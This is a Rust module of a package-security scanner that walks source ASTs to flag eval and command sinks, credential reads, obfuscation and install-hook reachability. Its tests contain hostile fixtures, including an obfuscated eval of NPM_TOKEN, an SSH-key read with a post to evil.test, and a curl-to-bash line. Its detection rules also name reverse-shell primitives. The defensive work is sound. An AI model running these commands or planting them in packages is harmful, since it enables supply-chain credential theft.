//! Multi-language `tree-sitter` AST & taint-graph indexer (`PackageAstIndexV1`).
//!
//! Parses JavaScript/TypeScript, Python, Rust, and POSIX shell scripts inside a
//! bounded [`creg_unpack::UnpackedArchive`] using iterative (stack-safe) AST
//! traversals, indexing dangerous execution/reflection sinks, sensitive
//! credential accesses, obfuscation constructs (e.g. `global[atob(...)]`), and
//! reachability edges from install hooks or top-level entrypoints.

use common::{Finding, FindingSeverity, PackageManifest};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

const MAX_AST_NODES_PER_FILE: usize = 100_000;
const MAX_AST_HITS_PER_FILE: usize = 64;
const HIGH_ENTROPY_LITERAL_MIN_LEN: usize = 40;
const HIGH_ENTROPY_LITERAL_THRESHOLD: f64 = 4.8;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SinkKind {
    DynamicEval,
    CommandExecution,
    DynamicLoadOrFfi,
    UnsafeDeserialization,
    NetworkExfil,
    FileSystemMutation,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SensitiveSourceKind {
    ProcessEnv,
    SshKeys,
    AwsCredentials,
    NpmrcOrPypirc,
    CregSecrets,
    BrowserOrKeychain,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ObfuscationKind {
    FromCharCodeChain,
    ComputedBracketCall,
    ChainedDecodeExec,
    HighEntropyLiteral,
    ExtremeAstDepth,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct AstSinkHit {
    pub file: String,
    pub line: usize,
    pub scope: String,
    pub is_hook_file: bool,
    pub kind: SinkKind,
    pub symbol: String,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct AstSensitiveRead {
    pub file: String,
    pub line: usize,
    pub scope: String,
    pub is_hook_file: bool,
    pub kind: SensitiveSourceKind,
    pub symbol: String,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct AstObfuscationSignal {
    pub file: String,
    pub line: usize,
    pub scope: String,
    pub is_hook_file: bool,
    pub kind: ObfuscationKind,
    pub detail: String,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct AstReachabilityEdge {
    pub file: String,
    pub entry_scope: String,
    pub is_hook_file: bool,
    pub sink_kind: SinkKind,
    pub sink_symbol: String,
    pub line: usize,
}

/// Deterministic AST & taint-graph index produced for consensus and Zone 4 agentic review.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PackageAstIndexV1 {
    pub schema_version: String,
    pub files_parsed: usize,
    pub parse_errors: usize,
    pub max_ast_depth: u32,
    pub sinks: Vec<AstSinkHit>,
    pub sensitive_reads: Vec<AstSensitiveRead>,
    pub obfuscation_signals: Vec<AstObfuscationSignal>,
    pub reachability_edges: Vec<AstReachabilityEdge>,
}

impl Default for PackageAstIndexV1 {
    fn default() -> Self {
        Self {
            schema_version: "creg-ast-index-v1".to_string(),
            files_parsed: 0,
            parse_errors: 0,
            max_ast_depth: 0,
            sinks: Vec::new(),
            sensitive_reads: Vec::new(),
            obfuscation_signals: Vec::new(),
            reachability_edges: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LangKind {
    JavaScript,
    Python,
    Rust,
    Shell,
}

fn detect_lang(path: &str) -> Option<LangKind> {
    let ext = std::path::Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase())
        .unwrap_or_default();
    match ext.as_str() {
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "mts" | "cts" | "tsx" => Some(LangKind::JavaScript),
        "py" | "pyw" | "pyi" | "pth" => Some(LangKind::Python),
        "rs" => Some(LangKind::Rust),
        "sh" | "bash" | "zsh" | "ksh" => Some(LangKind::Shell),
        _ => None,
    }
}

fn is_hook_path(path: &str, hook_paths: &[String]) -> bool {
    let lower = path.to_ascii_lowercase();
    if hook_paths.iter().any(|h| h.eq_ignore_ascii_case(path)) {
        return true;
    }
    lower.ends_with("/build.rs")
        || lower == "build.rs"
        || lower.ends_with("/setup.py")
        || lower == "setup.py"
        || lower.ends_with(".pth")
        || lower.contains("postinstall")
        || lower.contains("preinstall")
}

/// Analyzes source files in `archive` deterministically via iterative `tree-sitter`
/// AST walks and shell inspection.
pub fn analyze_archive(
    archive: &creg_unpack::UnpackedArchive,
    _ecosystem: &str,
    hook_paths: &[String],
) -> PackageAstIndexV1 {
    let mut index = PackageAstIndexV1::default();

    for file in &archive.files {
        let Some(lang) = detect_lang(&file.path) else {
            continue;
        };
        let is_hook = is_hook_path(&file.path, hook_paths);
        let text = file.text_lossy();
        match lang {
            LangKind::Shell => {
                index.files_parsed += 1;
                analyze_shell_script(&file.path, &text, is_hook, &mut index);
            }
            LangKind::JavaScript | LangKind::Python | LangKind::Rust => {
                analyze_tree_sitter_file(&file.path, &text, lang, is_hook, &mut index);
            }
        }
    }

    index.sinks.sort();
    index.sinks.dedup();
    index.sensitive_reads.sort();
    index.sensitive_reads.dedup();
    index.obfuscation_signals.sort();
    index.obfuscation_signals.dedup();
    index.reachability_edges.sort();
    index.reachability_edges.dedup();
    index
}

fn analyze_tree_sitter_file(
    path: &str,
    code: &str,
    lang: LangKind,
    is_hook: bool,
    index: &mut PackageAstIndexV1,
) {
    let mut parser = tree_sitter::Parser::new();
    let ts_lang = match lang {
        LangKind::JavaScript => tree_sitter_javascript::language(),
        LangKind::Python => tree_sitter_python::language(),
        LangKind::Rust => tree_sitter_rust::language(),
        LangKind::Shell => return,
    };
    if parser.set_language(ts_lang).is_err() {
        index.parse_errors += 1;
        return;
    }
    let Some(tree) = parser.parse(code, None) else {
        index.parse_errors += 1;
        return;
    };

    index.files_parsed += 1;
    let src = code.as_bytes();
    let root = tree.root_node();
    if root.has_error() {
        index.parse_errors += 1;
    }

    // Iterative explicit stack carrying (node, ast_depth, enclosing_scope)
    let mut stack: Vec<(tree_sitter::Node<'_>, u32, String)> =
        vec![(root, 0, "<top-level>".to_string())];
    let mut visited = 0usize;
    let mut file_hits = 0usize;
    let mut file_max_depth = 0u32;

    while let Some((node, depth, scope)) = stack.pop() {
        visited += 1;
        file_max_depth = file_max_depth.max(depth);
        if visited > MAX_AST_NODES_PER_FILE || file_hits >= MAX_AST_HITS_PER_FILE {
            break;
        }

        let kind = node.kind();
        let line = node.start_position().row + 1;
        let next_scope = enclosing_scope_name(node, src, &scope);

        if matches!(
            kind,
            "call_expression" | "new_expression" | "call" | "macro_invocation" | "unsafe_block"
        ) {
            let text = node_text(node, src);
            inspect_call_or_unsafe(
                path,
                line,
                &scope,
                is_hook,
                lang,
                kind,
                node,
                src,
                &text,
                index,
                &mut file_hits,
            );
        } else if matches!(
            kind,
            "member_expression" | "attribute" | "scoped_identifier"
        ) {
            let text = node_text(node, src);
            inspect_sensitive_expr(path, line, &scope, is_hook, &text, index, &mut file_hits);
        } else if matches!(
            kind,
            "string" | "template_string" | "string_literal" | "raw_string_literal"
        ) {
            let text = node_text(node, src);
            inspect_string_literal(path, line, &scope, is_hook, &text, index, &mut file_hits);
        }

        let mut cursor = node.walk();
        let children: Vec<_> = node.children(&mut cursor).collect();
        for child in children.into_iter().rev() {
            stack.push((child, depth.saturating_add(1), next_scope.clone()));
        }
    }

    index.max_ast_depth = index.max_ast_depth.max(file_max_depth);
    if file_max_depth > 32 {
        index.obfuscation_signals.push(AstObfuscationSignal {
            file: path.to_string(),
            line: 1,
            scope: "<file>".to_string(),
            is_hook_file: is_hook,
            kind: ObfuscationKind::ExtremeAstDepth,
            detail: format!("AST depth {file_max_depth} exceeds threshold 32"),
        });
    }
}

fn enclosing_scope_name(node: tree_sitter::Node<'_>, src: &[u8], current: &str) -> String {
    let kind = node.kind();
    if matches!(
        kind,
        "function_declaration" | "method_definition" | "function_definition" | "function_item"
    ) {
        if let Some(name_node) = node.child_by_field_name("name") {
            let name = node_text(name_node, src);
            if !name.is_empty() {
                return name;
            }
        }
        return "<anonymous-fn>".to_string();
    }
    if matches!(kind, "arrow_function" | "function") && current == "<top-level>" {
        return "<top-level-closure>".to_string();
    }
    current.to_string()
}

fn node_text(node: tree_sitter::Node<'_>, src: &[u8]) -> String {
    node.utf8_text(src).map(str::to_string).unwrap_or_else(|_| {
        String::from_utf8_lossy(&src[node.start_byte()..node.end_byte()]).to_string()
    })
}

fn push_sink(
    index: &mut PackageAstIndexV1,
    file_hits: &mut usize,
    path: &str,
    line: usize,
    scope: &str,
    is_hook: bool,
    kind: SinkKind,
    symbol: &str,
) {
    if *file_hits >= MAX_AST_HITS_PER_FILE {
        return;
    }
    *file_hits += 1;
    index.sinks.push(AstSinkHit {
        file: path.to_string(),
        line,
        scope: scope.to_string(),
        is_hook_file: is_hook,
        kind,
        symbol: symbol.to_string(),
    });
    if is_hook || scope == "<top-level>" || scope == "<top-level-closure>" {
        index.reachability_edges.push(AstReachabilityEdge {
            file: path.to_string(),
            entry_scope: scope.to_string(),
            is_hook_file: is_hook,
            sink_kind: kind,
            sink_symbol: symbol.to_string(),
            line,
        });
    }
}

#[allow(clippy::too_many_arguments)]
fn inspect_call_or_unsafe(
    path: &str,
    line: usize,
    scope: &str,
    is_hook: bool,
    lang: LangKind,
    node_kind: &str,
    node: tree_sitter::Node<'_>,
    src: &[u8],
    call_text: &str,
    index: &mut PackageAstIndexV1,
    file_hits: &mut usize,
) {
    if node_kind == "unsafe_block" {
        if is_hook {
            push_sink(
                index,
                file_hits,
                path,
                line,
                scope,
                is_hook,
                SinkKind::DynamicLoadOrFfi,
                "unsafe_in_build_hook",
            );
        }
        return;
    }

    let callee = node
        .child_by_field_name("function")
        .or_else(|| node.child_by_field_name("constructor"))
        .map(|n| (n.kind(), node_text(n, src)));

    // Detect computed bracket invocation: `global[atob(...)](...)` or `globalThis['ev'+'al'](...)`
    if let Some((callee_kind, callee_name)) = &callee {
        if *callee_kind == "subscript_expression" {
            let callee_lower = callee_name.to_ascii_lowercase();
            if callee_lower.contains("global")
                || callee_lower.contains("window")
                || callee_lower.contains("self")
                || callee_lower.contains("atob")
                || callee_lower.contains("fromcharcode")
                || callee_lower.contains("buffer.from")
                || callee_lower.contains('+')
            {
                *file_hits += 1;
                index.obfuscation_signals.push(AstObfuscationSignal {
                    file: path.to_string(),
                    line,
                    scope: scope.to_string(),
                    is_hook_file: is_hook,
                    kind: ObfuscationKind::ComputedBracketCall,
                    detail: callee_name.chars().take(120).collect(),
                });
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::DynamicEval,
                    "computed_bracket_call",
                );
            }
        }
    }

    let callee_str = callee
        .as_ref()
        .map(|(_, s)| s.as_str())
        .unwrap_or(call_text);
    let callee_lower = callee_str.to_ascii_lowercase();
    let call_lower = call_text.to_ascii_lowercase();

    match lang {
        LangKind::JavaScript => {
            if callee_lower == "eval"
                || callee_lower == "function"
                || callee_lower.ends_with(".runincontext")
                || callee_lower.ends_with(".runinthiscontext")
                || callee_lower.ends_with(".runinnewwindow")
                || node_kind == "new_expression" && callee_lower == "function"
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::DynamicEval,
                    callee_str,
                );
            } else if call_lower.contains("child_process")
                || matches!(
                    callee_lower.as_str(),
                    "exec"
                        | "execsync"
                        | "spawn"
                        | "spawnsync"
                        | "execfile"
                        | "execfilesync"
                        | "fork"
                )
                || callee_lower.ends_with(".exec")
                || callee_lower.ends_with(".execsync")
                || callee_lower.ends_with(".spawn")
                || callee_lower.ends_with(".spawnsync")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::CommandExecution,
                    callee_str,
                );
            } else if callee_lower == "fetch"
                || callee_lower.starts_with("http.request")
                || callee_lower.starts_with("https.request")
                || callee_lower.starts_with("http.get")
                || callee_lower.starts_with("https.get")
                || callee_lower.starts_with("axios.")
                || callee_lower.starts_with("net.connect")
                || callee_lower.starts_with("dgram.createsocket")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::NetworkExfil,
                    callee_str,
                );
            } else if callee_lower.starts_with("fs.write")
                || callee_lower.starts_with("fs.append")
                || callee_lower.starts_with("fs.chmod")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::FileSystemMutation,
                    callee_str,
                );
            }

            if (call_lower.contains("atob(") || call_lower.contains("buffer.from("))
                && (call_lower.contains("eval(")
                    || call_lower.contains("function(")
                    || call_lower.contains("execsync("))
            {
                *file_hits += 1;
                index.obfuscation_signals.push(AstObfuscationSignal {
                    file: path.to_string(),
                    line,
                    scope: scope.to_string(),
                    is_hook_file: is_hook,
                    kind: ObfuscationKind::ChainedDecodeExec,
                    detail: "decoded payload passed directly to dynamic execution".to_string(),
                });
            }
            if call_lower.contains("string.fromcharcode") {
                *file_hits += 1;
                index.obfuscation_signals.push(AstObfuscationSignal {
                    file: path.to_string(),
                    line,
                    scope: scope.to_string(),
                    is_hook_file: is_hook,
                    kind: ObfuscationKind::FromCharCodeChain,
                    detail: "String.fromCharCode dynamic string construction".to_string(),
                });
            }
        }
        LangKind::Python => {
            if matches!(callee_lower.as_str(), "eval" | "exec" | "__import__")
                || callee_lower == "importlib.import_module"
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::DynamicEval,
                    callee_str,
                );
            } else if matches!(
                callee_lower.as_str(),
                "os.system" | "os.popen" | "pty.spawn" | "commands.getoutput"
            ) || callee_lower.starts_with("subprocess.")
                || callee_lower.starts_with("os.exec")
                || callee_lower.starts_with("os.spawn")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::CommandExecution,
                    callee_str,
                );
            } else if matches!(
                callee_lower.as_str(),
                "pickle.loads" | "pickle.load" | "marshal.loads" | "yaml.unsafe_load"
            ) {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::UnsafeDeserialization,
                    callee_str,
                );
            } else if callee_lower.starts_with("ctypes.cdll")
                || callee_lower.starts_with("ctypes.windll")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::DynamicLoadOrFfi,
                    callee_str,
                );
            } else if callee_lower.starts_with("urllib.request")
                || callee_lower.starts_with("requests.")
                || callee_lower.starts_with("httpx.")
                || callee_lower.ends_with(".connect")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::NetworkExfil,
                    callee_str,
                );
            }
            if (call_lower.contains("b64decode") || call_lower.contains("bytes.fromhex"))
                && (call_lower.contains("exec(") || call_lower.contains("eval("))
            {
                *file_hits += 1;
                index.obfuscation_signals.push(AstObfuscationSignal {
                    file: path.to_string(),
                    line,
                    scope: scope.to_string(),
                    is_hook_file: is_hook,
                    kind: ObfuscationKind::ChainedDecodeExec,
                    detail: "decoded Python payload executed dynamically".to_string(),
                });
            }
        }
        LangKind::Rust => {
            if call_lower.contains("command::new") || call_lower.contains("std::process::command") {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::CommandExecution,
                    callee_str,
                );
            } else if call_lower.contains("libloading::library") || call_lower.contains("dlopen") {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::DynamicLoadOrFfi,
                    callee_str,
                );
            } else if call_lower.contains("tcpstream::connect")
                || call_lower.contains("reqwest::")
                || call_lower.contains("ureq::")
            {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::NetworkExfil,
                    callee_str,
                );
            } else if call_lower.contains("std::fs::write") || call_lower.contains("fs::write") {
                push_sink(
                    index,
                    file_hits,
                    path,
                    line,
                    scope,
                    is_hook,
                    SinkKind::FileSystemMutation,
                    callee_str,
                );
            }
        }
        LangKind::Shell => {}
    }
}

fn inspect_sensitive_expr(
    path: &str,
    line: usize,
    scope: &str,
    is_hook: bool,
    expr_text: &str,
    index: &mut PackageAstIndexV1,
    file_hits: &mut usize,
) {
    if *file_hits >= MAX_AST_HITS_PER_FILE {
        return;
    }
    let lower = expr_text.to_ascii_lowercase();
    let kind = if lower == "process.env"
        || lower.starts_with("process.env.")
        || lower == "os.environ"
        || lower.starts_with("os.environ.")
        || lower == "std::env::vars"
        || lower == "std::env::var"
    {
        Some(SensitiveSourceKind::ProcessEnv)
    } else if lower.contains(".ssh/id_") || lower.contains("known_hosts") {
        Some(SensitiveSourceKind::SshKeys)
    } else if lower.contains(".aws/credentials") || lower.contains("aws_secret_access_key") {
        Some(SensitiveSourceKind::AwsCredentials)
    } else if lower.contains(".npmrc") || lower.contains(".pypirc") || lower.contains("npm_token") {
        Some(SensitiveSourceKind::NpmrcOrPypirc)
    } else if lower.contains(".creg") || lower.contains("creg_validator_key") {
        Some(SensitiveSourceKind::CregSecrets)
    } else {
        None
    };

    if let Some(kind) = kind {
        *file_hits += 1;
        index.sensitive_reads.push(AstSensitiveRead {
            file: path.to_string(),
            line,
            scope: scope.to_string(),
            is_hook_file: is_hook,
            kind,
            symbol: expr_text.chars().take(80).collect(),
        });
    }
}

fn inspect_string_literal(
    path: &str,
    line: usize,
    scope: &str,
    is_hook: bool,
    literal: &str,
    index: &mut PackageAstIndexV1,
    file_hits: &mut usize,
) {
    if *file_hits >= MAX_AST_HITS_PER_FILE {
        return;
    }
    let stripped = literal.trim_matches(|c| c == '\'' || c == '"' || c == '`');
    let lower = stripped.to_ascii_lowercase();

    let sens = if lower.contains(".ssh/id_rsa")
        || lower.contains(".ssh/id_ed25519")
        || lower.contains("authorized_keys")
    {
        Some(SensitiveSourceKind::SshKeys)
    } else if lower.contains(".aws/credentials") || lower.contains("aws_secret_access_key") {
        Some(SensitiveSourceKind::AwsCredentials)
    } else if lower.contains(".npmrc") || lower.contains(".pypirc") {
        Some(SensitiveSourceKind::NpmrcOrPypirc)
    } else if lower.contains(".creg") || lower.contains("creg_validator_key") {
        Some(SensitiveSourceKind::CregSecrets)
    } else if lower.contains("chrome/user data")
        || lower.contains(".mozilla/firefox")
        || lower.contains("login data")
    {
        Some(SensitiveSourceKind::BrowserOrKeychain)
    } else {
        None
    };

    if let Some(kind) = sens {
        *file_hits += 1;
        index.sensitive_reads.push(AstSensitiveRead {
            file: path.to_string(),
            line,
            scope: scope.to_string(),
            is_hook_file: is_hook,
            kind,
            symbol: stripped.chars().take(80).collect(),
        });
    }

    if stripped.len() >= HIGH_ENTROPY_LITERAL_MIN_LEN && !stripped.contains(' ') {
        let entropy = creg_unpack::shannon_entropy_bytes(stripped.as_bytes());
        if entropy >= HIGH_ENTROPY_LITERAL_THRESHOLD {
            *file_hits += 1;
            index.obfuscation_signals.push(AstObfuscationSignal {
                file: path.to_string(),
                line,
                scope: scope.to_string(),
                is_hook_file: is_hook,
                kind: ObfuscationKind::HighEntropyLiteral,
                detail: format!("len={} entropy={:.2}", stripped.len(), entropy),
            });
        }
    }
}

fn analyze_shell_script(path: &str, code: &str, is_hook: bool, index: &mut PackageAstIndexV1) {
    let mut hits = 0usize;
    let scope = if is_hook { "<hook>" } else { "<script>" };
    for (idx, raw_line) in code.lines().enumerate() {
        let trimmed = raw_line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let line = idx + 1;
        let lower = trimmed.to_ascii_lowercase();
        if (lower.contains("curl ") || lower.contains("wget "))
            && (lower.contains("| sh")
                || lower.contains("|sh")
                || lower.contains("| bash")
                || lower.contains("|bash"))
        {
            push_sink(
                index,
                &mut hits,
                path,
                line,
                scope,
                is_hook,
                SinkKind::CommandExecution,
                "remote_pipe_to_shell",
            );
            push_sink(
                index,
                &mut hits,
                path,
                line,
                scope,
                is_hook,
                SinkKind::NetworkExfil,
                "shell_network_fetch",
            );
        } else if lower.contains("/dev/tcp/") || lower.contains("nc -e") {
            push_sink(
                index,
                &mut hits,
                path,
                line,
                scope,
                is_hook,
                SinkKind::CommandExecution,
                "reverse_shell_primitive",
            );
        } else if lower.contains("base64 -d")
            && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("eval "))
        {
            hits += 1;
            index.obfuscation_signals.push(AstObfuscationSignal {
                file: path.to_string(),
                line,
                scope: scope.to_string(),
                is_hook_file: is_hook,
                kind: ObfuscationKind::ChainedDecodeExec,
                detail: "base64 -d piped into shell execution".to_string(),
            });
        }
        inspect_sensitive_expr(path, line, scope, is_hook, trimmed, index, &mut hits);
        if hits >= MAX_AST_HITS_PER_FILE {
            break;
        }
    }
}

impl PackageAstIndexV1 {
    /// Emits deterministic AST findings suitable for `StaticAnalysisResult`.
    pub fn to_findings(&self, manifest: &PackageManifest) -> Vec<Finding> {
        let mut findings = Vec::new();
        let mut emitted_taint_files = BTreeSet::new();
        let mut emitted_obf_files = BTreeSet::new();
        let mut emitted_hook_files = BTreeSet::new();
        let mut emitted_deser_files = BTreeSet::new();
        let mut emitted_entropy_files = BTreeSet::new();

        for sig in &self.obfuscation_signals {
            match sig.kind {
                ObfuscationKind::ComputedBracketCall | ObfuscationKind::ChainedDecodeExec => {
                    if emitted_obf_files.insert(sig.file.clone()) {
                        let critical = sig.is_hook_file
                            || sig.scope == "<top-level>"
                            || sig.scope == "<top-level-closure>";
                        findings.push(Finding {
                            id: "ST-AST-OBFUSCATED-CALL".into(),
                            title: "Obfuscated dynamic call expression".into(),
                            severity: if critical {
                                FindingSeverity::Critical
                            } else {
                                FindingSeverity::High
                            },
                            description: format!(
                                "AST analysis detected {:?} in scope '{}': {}",
                                sig.kind, sig.scope, sig.detail
                            ),
                            file: sig.file.clone(),
                            line: Some(sig.line),
                        });
                    }
                }
                ObfuscationKind::HighEntropyLiteral => {
                    if sig.detail.starts_with("len=")
                        && emitted_entropy_files.insert(sig.file.clone())
                    {
                        let long_enough = sig
                            .detail
                            .split_whitespace()
                            .next()
                            .and_then(|t| t.strip_prefix("len="))
                            .and_then(|n| n.parse::<usize>().ok())
                            .unwrap_or(0)
                            >= 64;
                        if long_enough {
                            findings.push(Finding {
                                id: "ST-AST-HIGH-ENTROPY-LITERAL".into(),
                                title: "High-entropy literal in AST".into(),
                                severity: FindingSeverity::Medium,
                                description: format!(
                                    "AST string literal shows high entropy ({}).",
                                    sig.detail
                                ),
                                file: sig.file.clone(),
                                line: Some(sig.line),
                            });
                        }
                    }
                }
                ObfuscationKind::FromCharCodeChain | ObfuscationKind::ExtremeAstDepth => {}
            }
        }

        // Group sensitive reads and sinks per file for conservative intra-file taint matching.
        let mut reads_by_file: BTreeMap<&str, Vec<&AstSensitiveRead>> = BTreeMap::new();
        for read in &self.sensitive_reads {
            reads_by_file.entry(&read.file).or_default().push(read);
        }
        let mut sinks_by_file: BTreeMap<&str, Vec<&AstSinkHit>> = BTreeMap::new();
        for sink in &self.sinks {
            sinks_by_file.entry(&sink.file).or_default().push(sink);
        }

        for (file, reads) in &reads_by_file {
            let Some(sinks) = sinks_by_file.get(file) else {
                continue;
            };
            let has_exfil_sink = sinks.iter().any(|s| {
                matches!(
                    s.kind,
                    SinkKind::NetworkExfil | SinkKind::CommandExecution | SinkKind::DynamicEval
                )
            });
            if !has_exfil_sink {
                continue;
            }
            let only_env_reads = reads
                .iter()
                .all(|r| r.kind == SensitiveSourceKind::ProcessEnv);
            let in_hook = reads.iter().any(|r| r.is_hook_file);
            if only_env_reads && !manifest.allowed_network_hosts.is_empty() && !in_hook {
                continue;
            }
            if emitted_taint_files.insert((*file).to_string()) {
                let first_read = reads[0];
                let first_sink = sinks[0];
                findings.push(Finding {
                    id: "ST-AST-TAINT-EXFIL".into(),
                    title: "AST credential-to-sink exfiltration pattern".into(),
                    severity: FindingSeverity::Critical,
                    description: format!(
                        "File accesses sensitive source {:?} ('{}') alongside sink {:?} ('{}').",
                        first_read.kind, first_read.symbol, first_sink.kind, first_sink.symbol
                    ),
                    file: (*file).to_string(),
                    line: Some(first_sink.line),
                });
            }
        }

        for edge in &self.reachability_edges {
            if !edge.is_hook_file {
                continue;
            }
            if !matches!(
                edge.sink_kind,
                SinkKind::DynamicEval
                    | SinkKind::CommandExecution
                    | SinkKind::DynamicLoadOrFfi
                    | SinkKind::NetworkExfil
            ) {
                continue;
            }
            let file_sinks = sinks_by_file.get(edge.file.as_str());
            let only_declared_spawn = edge.sink_kind == SinkKind::CommandExecution
                && manifest.spawns_processes
                && !file_sinks.is_some_and(|list| {
                    list.iter().any(|s| {
                        matches!(
                            s.kind,
                            SinkKind::NetworkExfil
                                | SinkKind::DynamicEval
                                | SinkKind::DynamicLoadOrFfi
                        )
                    })
                })
                && !self.obfuscation_signals.iter().any(|o| o.file == edge.file);
            if only_declared_spawn {
                continue;
            }
            if emitted_hook_files.insert(edge.file.clone()) {
                findings.push(Finding {
                    id: "ST-AST-HOOK-SINK".into(),
                    title: "Install/build hook reaches dangerous sink".into(),
                    severity: FindingSeverity::Critical,
                    description: format!(
                        "Hook file scope '{}' reaches {:?} sink '{}'.",
                        edge.entry_scope, edge.sink_kind, edge.sink_symbol
                    ),
                    file: edge.file.clone(),
                    line: Some(edge.line),
                });
            }
        }

        for sink in &self.sinks {
            if sink.kind == SinkKind::UnsafeDeserialization
                && emitted_deser_files.insert(sink.file.clone())
            {
                findings.push(Finding {
                    id: "ST-AST-UNSAFE-DESER".into(),
                    title: "Unsafe deserialization primitive in AST".into(),
                    severity: FindingSeverity::High,
                    description: format!(
                        "Detected unsafe deserialization call '{}' in scope '{}'.",
                        sink.symbol, sink.scope
                    ),
                    file: sink.file.clone(),
                    line: Some(sink.line),
                });
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_archive(files: &[(&str, &[u8])]) -> creg_unpack::UnpackedArchive {
        use flate2::write::GzEncoder;
        use flate2::Compression;

        let encoder = GzEncoder::new(Vec::new(), Compression::default());
        let mut builder = tar::Builder::new(encoder);
        for (path, data) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            builder.append_data(&mut h, *path, *data).unwrap();
        }
        let gz = builder.into_inner().unwrap().finish().unwrap();
        creg_unpack::unpack_tarball(&gz).expect("unpack fixture")
    }

    #[test]
    fn detects_js_computed_bracket_call_and_taint_exfil() {
        let code = br#"
            const token = process.env.NPM_TOKEN;
            global[atob("ZXZhbA==")](token);
        "#;
        let archive = test_archive(&[("package/scripts/init.js", code)]);
        let idx = analyze_archive(&archive, "npm", &["package/scripts/init.js".into()]);
        assert!(idx
            .obfuscation_signals
            .iter()
            .any(|s| s.kind == ObfuscationKind::ComputedBracketCall));
        assert!(!idx.sensitive_reads.is_empty());
        assert!(!idx.reachability_edges.is_empty());

        let findings = idx.to_findings(&PackageManifest::default());
        assert!(findings.iter().any(|f| f.id == "ST-AST-OBFUSCATED-CALL"));
        assert!(findings.iter().any(|f| f.id == "ST-AST-TAINT-EXFIL"));
        assert!(findings.iter().any(|f| f.id == "ST-AST-HOOK-SINK"));
    }

    #[test]
    fn detects_python_pickle_and_rust_build_rs_and_shell() {
        let py = b"import pickle\nopen('/home/u/.ssh/id_rsa')\npickle.loads(data)\nrequests.post('https://evil.test')\n";
        let rs = b"fn main() { std::process::Command::new(\"sh\"); }";
        let sh = b"#!/bin/sh\ncurl -fsSL https://evil.test/x.sh | bash\n";
        let archive = test_archive(&[
            ("pkg/mod.py", py),
            ("build.rs", rs),
            ("scripts/install.sh", sh),
        ]);
        let idx = analyze_archive(&archive, "cargo", &[]);
        let findings = idx.to_findings(&PackageManifest::default());
        assert!(findings.iter().any(|f| f.id == "ST-AST-UNSAFE-DESER"));
        assert!(findings.iter().any(|f| f.id == "ST-AST-TAINT-EXFIL"));
        assert!(findings
            .iter()
            .any(|f| f.id == "ST-AST-HOOK-SINK" && f.file == "build.rs"));
        assert!(idx
            .sinks
            .iter()
            .any(|s| s.file == "scripts/install.sh" && s.kind == SinkKind::CommandExecution));
    }

    #[test]
    fn handles_deeply_nested_js_without_stack_overflow() {
        let deep = format!("{}1{}", "(".repeat(2500), ")".repeat(2500));
        let archive = test_archive(&[("package/deep.js", deep.as_bytes())]);
        let idx = analyze_archive(&archive, "npm", &[]);
        assert_eq!(idx.files_parsed, 1);
    }
}
